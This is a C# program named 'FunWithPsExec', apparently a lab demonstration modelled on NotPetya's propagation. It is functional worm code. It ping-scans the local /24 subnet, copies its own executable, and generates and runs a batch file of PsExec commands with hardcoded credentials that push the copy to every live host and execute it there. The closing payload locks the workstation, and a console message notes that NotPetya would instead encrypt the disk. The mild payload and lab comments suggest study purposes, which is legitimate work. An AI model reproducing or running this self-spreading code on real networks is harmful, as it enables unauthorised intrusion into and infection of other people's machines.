﻿using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;


namespace FunWithPsExec
{
    class Program
    {
        private const string victimZeroIP = "ur ip here";
        private static string thisIP;
        private static string ThisIP
        {
            get
            {
                if (thisIP == null)
                {

                    using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                    {
                        socket.Connect("8.8.8.8", 65530);
                        IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                        thisIP = endPoint.Address.ToString();
                    }
                }
                return thisIP;
            }
        }
        private static List<string> ips = new List<string>();
        private static string currentUserName = Environment.UserName;
        private static string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;
        private static string thisUniqueFileName;
        private static string ThisUniqueFileName
        {
            get
            {
                if (thisUniqueFileName == null)
                {
                    thisUniqueFileName = ThisIP + "_" + DateTime.Now.ToString();
                    thisUniqueFileName = thisUniqueFileName.Replace("/", "").Replace(":", "").Replace(" ", "").Replace(".", "");
                }
                return thisUniqueFileName;
            }
        }





        static void Main(string[] args)
        {
            // If this application is already running on this computer
            // dont start another instance, as enough copies of this might
            // use up all the computers resources so that none of them will 
            // finish execution due to freezing/out of memory errors.
            if (ThisIP != victimZeroIP && AlreadyRunningOnMachine())
                return;

            // Scanning fra denne computer af netværket.
            ScanNetwork();
            Thread.Sleep(1000);

            // Oprettelse af opdaterede filer, så klar til vidersendelse.
            CreateNewSenderFiles();
            Thread.Sleep(1000);

            // Send filerne videre: Manager(FunWithPsExec)
            SendFile(AppDomain.CurrentDomain.BaseDirectory + ThisUniqueFileName + "Sender.bat");
            Thread.Sleep(1000);

            // Afslut sekvensen.
            EncryptHarddisk();
        }

        private static bool AlreadyRunningOnMachine()
        {
            string processToLookFor = "FunWithPsExec"; 

            foreach (Process runningProcess in Process.GetProcesses())
            {
                if (runningProcess.ProcessName.Contains(processToLookFor) && runningProcess.ProcessName != System.Diagnostics.Process.GetCurrentProcess().ProcessName)
                {
                    return true;
                }
            }
            return false;
        }

        private static void CreateNewSenderFiles()
        {
            System.IO.File.Copy(currentDirectory + System.AppDomain.CurrentDomain.FriendlyName, currentDirectory + ThisUniqueFileName + "FunWithPsExec.exe");

            try
            {
                StreamWriter mainFile = new StreamWriter(currentDirectory + ThisUniqueFileName + "Sender.bat");
                for (int i = 0; i < ips.Count; i++)
                {
                    // Target virtual machine use a Windows user called Kaspwer with the password best123pw
                    string propagationCommand = currentDirectory + @"\psexec \\" + ips[i] + @" -u Kasper -p best123pw -i -c -d " + currentDirectory + ThisUniqueFileName + "FunWithPsExec.exe -d";
                    propagationCommand = propagationCommand.Replace("\\", @"\");
                    mainFile.WriteLine(propagationCommand);

                    propagationCommand = currentDirectory + @"\psexec \\" + ips[i] + @" -u Kasper -p best123pw -i -c -d " + currentDirectory + @"\PsExec.exe /accepteula -d";
                    propagationCommand = propagationCommand.Replace("\\", @"\");
                    mainFile.WriteLine(propagationCommand);
                }
                mainFile.WriteLine(@"CLS");
                mainFile.WriteLine(@"EXIT");
                mainFile.Close();
                if (mainFile != null)
                {
                    mainFile = null;
                }
            }
            catch (Exception e)
            {
                throw e;
            }
        }

        private static void SendFile(string _filePath)
        {
            if (!File.Exists(_filePath))
            {
                throw new FileNotFoundException("This file was not found.");
            }

            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.RedirectStandardInput = true;

            try
            {
                p.StartInfo.FileName = _filePath;
                p.Start();
                p.WaitForExit(2000);
            }

            catch (IOException ex)
            {
                Console.WriteLine(ex);
            }


            Console.WriteLine("\nPROPAGATION COMPLETE...");
        }


        // Inspiration: https://www.codeproject.com/Tips/480049/%2FTips%2F480049%2FShut-Down-Restart-Log-off-Lock-Hibernate-or-Sleep
        private static void EncryptHarddisk()
        {
            void ClearLine()
            {
                Console.SetCursorPosition(0, Console.CursorTop - 1);
                Console.Write(new string(' ', Console.WindowWidth));
                Console.SetCursorPosition(0, Console.CursorTop - 1);
            }

            Console.WriteLine("\nFINISHING... \nThis is usually where NotPetya would restart and encrypt the victims harddisk... " +
                "\nHowever we will settle with locking your device with your own credentials, if your not fast enough to close this program that is tihi!");

            for (int i = 10; i > 0; i--)
            {
                Console.WriteLine(i);
                Thread.Sleep(1000);
                ClearLine();
            }

            // Need to keep the host machine alive, or we cant 
            // see whats going in with the networked VMs.
            if (ThisIP != victimZeroIP)
            {
                Console.WriteLine("SLEEEEEEEEEEEEEPING IN 1!");
                Thread.Sleep(1000);

                ProcessStartInfo startinfo4 = new ProcessStartInfo("Rundll32.exe", "User32.dll, LockWorkStation");
                Process.Start(startinfo4);
            }

            Console.WriteLine("BYE!");
            Thread.Sleep(1000);
        }

        private static Tuple<string, string> GetCredentials()
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/C ipconfig";
            process.Start();

            string output = process.StandardOutput.ReadToEnd();

            Tuple<string, string> result = Tuple.Create("Username", "Password");
            return result;
        }

        private static void ScanNetwork()
        {
            // Inspiration: https://stackoverflow.com/questions/13492134/find-all-ip-address-in-a-network
            List<Ping> pingers = new List<Ping>();
            int instances = 0;
            object @lock = new object();
            int result = 0;
            int timeOut = 250;
            int ttl = 5;

            void StartScan()
            {
                string baseIP = "192.168.1.";

                // Console.WriteLine("Pinging 255 destinations of D-class in {0}*", baseIP);

                CreatePingers(255);

                PingOptions po = new PingOptions(ttl, true);
                System.Text.ASCIIEncoding enc = new System.Text.ASCIIEncoding();
                byte[] data = enc.GetBytes("abababababababababababababababab");

                SpinWait wait = new SpinWait();
                int cnt = 1;

                Stopwatch watch = Stopwatch.StartNew();

                foreach (Ping p in pingers)
                {
                    lock (@lock)
                    {
                        instances += 1;
                    }

                    p.SendAsync(string.Concat(baseIP, cnt.ToString()), timeOut, data, po);
                    cnt += 1;
                }

                while (instances > 0)
                {
                    wait.SpinOnce();
                }

                watch.Stop();

                DestroyPingers();
            }
            void Ping_completed(object s, PingCompletedEventArgs e)
            {
                lock (@lock)
                {
                    instances -= 1;
                }

                if (e.Reply.Status == IPStatus.Success)
                {
                    // Console.WriteLine(string.Concat("Targets: ", e.Reply.Address.ToString()));
                    ips.Add(e.Reply.Address.ToString());
                    result += 1;
                }
                else
                {
                    //Console.WriteLine(String.Concat("Non-active IP: ", e.Reply.Address.ToString()))
                }
            }
            void CreatePingers(int cnt)
            {
                for (int i = 1; i <= cnt; i++)
                {
                    Ping p = new Ping();
                    p.PingCompleted += Ping_completed;
                    pingers.Add(p);
                }
            }
            void DestroyPingers()
            {
                foreach (Ping p in pingers)
                {
                    p.PingCompleted -= Ping_completed;
                    p.Dispose();
                }

                pingers.Clear();
            }

            StartScan();

            Console.WriteLine("AVALIBLE TARGETS ON NETWORK:");

            // Remove own ip from avalible targets.
            for (int i = 0; i < ips.Count; i++)
            {
                if (ips[i] == ThisIP)
                {
                    ips.RemoveAt(i);
                }
            }

            // When running from host computer, only spread to two computers 
            // so we can prove that its infact that 2nd/3rd computer that has 
            // spread to the rest of the network. Also, normally
            // we dont mind spreading to a router/gateway, but for the first
            // target its better if its a computer for higher chance that it
            // will continue to spread (besides router it might also hit a phone,
            // printer or some IoT which is also unlikely to spread the worm).
            if (ThisIP == victimZeroIP)
            {
                // Remove the routers ip from avalible targets.
                for (int j = 0; j < ips.Count; j++)
                {
                    if (ips[j].EndsWith(".1"))
                    {
                        ips.RemoveAt(j);
                    }
                }

                // Remove entries until only 2 is left.
                for (int k = ips.Count - 1; k > 1; k--)
                {
                    if (ips.Count > 1)
                    {
                        ips.RemoveAt(k);
                    }
                }
            }

            for (int l = 0; l < ips.Count; l++)
            {
                Console.WriteLine(ips[l]);
            }


            Console.WriteLine("SCAN COMPLETE...");
        }
    }
}